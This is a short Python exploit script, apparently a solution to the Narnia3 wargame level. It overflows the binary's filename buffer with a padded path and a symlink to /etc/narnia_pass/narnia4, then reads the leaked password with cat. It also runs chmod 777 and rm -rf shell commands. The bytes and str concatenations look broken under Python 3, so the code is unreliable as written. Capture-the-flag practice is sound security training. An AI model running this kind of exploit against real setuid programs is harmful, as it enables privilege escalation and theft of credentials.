# run on target system
import os

tempdir = b"/tmp/tmp.rtM3SjDWF9"
os.system("rm -rf " + tempdir) # cleanup

fulldir = tempdir + b"/" + b"A"*(31 - len(tempdir))
fulldir = fulldir + b"/tmp"
filename = b"rtM3SjDWF9"
tempfile = b"/tmp/" + filename
os.system("rm " + tempfile) # cleanup

os.system(b"mkdir -p " + fulldir + b" && chmod -R 777 " + tempdir)
os.system(b"touch " + tempfile + b" && chmod 777 " + tempfile)
fulldir = fulldir + "/" + filename
os.system(b"ln -s /etc/narnia_pass/narnia4 " + fulldir)

os.system(b"/narnia/narnia3 " + fulldir)
os.system(b"cat " + tempfile)